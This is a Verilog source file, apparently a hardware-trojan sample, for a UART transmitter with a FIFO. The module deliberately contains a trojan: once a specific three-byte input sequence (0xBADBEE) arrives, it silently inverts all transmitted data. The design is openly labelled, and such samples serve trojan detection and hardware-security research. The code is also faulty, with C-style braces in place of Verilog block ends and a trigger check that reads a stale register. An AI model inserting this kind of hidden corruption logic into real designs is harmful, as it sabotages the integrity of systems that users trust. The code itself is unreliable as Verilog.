 // UART TX Module with FIFO and Data Corruption Trojan
//
// This module wraps the uart_tx module, adding a FIFO to buffer outgoing data.
// Includes a Hardware Trojan that inverts outgoing data once a specific trigger is met.
//
module uart_tx_fifo_data_corruption_trojan (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    // FIFO Memory and counters
    reg [7:0] mem [0:31];
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
    reg [4:0] cnt = 5'd0;
    reg we = 1'b0;
    reg [7:0] data = 8'd0;

    // Trojan trigger and effect
    reg trojan_triggered = 1'b0; // Indicator that trojan has been triggered
    reg [23:0] sequence_checker = 24'd0; // Checks for a specific sequence

    // UART Interface
    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(trojan_triggered ? ~data : data), // Inverts data if trojan is triggered
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Control Logic for FIFO and Trojan triggering
    wire read = ~uart_busy & (cnt > 5'd0) & ~we;
    wire write = rx_we & (cnt < 5'd31);

    always @ (posedge clk) begin
        // Manage FIFO operations
        if (write & ~read) begin
            cnt <= cnt + 5'd1;
            // Shift in the new data and check if the trojan trigger sequence is met
            sequence_checker <= {sequence_checker[15:0], rx_data};
            if (sequence_checker == 24'hBADBEE) begin
                trojan_triggered <= 1'b1; // Activate trojan on specific data sequence
            end
        } else if (read & ~write) begin
            cnt <= cnt - 5'd1;
        }

        if (read) begin
            r_addr <= r_addr + 5'd1;
            data <= mem[r_addr]; // Send out data from FIFO
            we <= 1'b1;
        } else begin
            we <= 1'b0;
        }
        
        if (write) begin
            w_addr <= w_addr + 5'd1;
            mem[w_addr] <= rx_data; // Store incoming data to FIFO
        end
    end

    always @ (*) begin
        tx_busy = (cnt != 0) || uart_busy; // Reflect UART activity and FIFO status
    end

endmodule
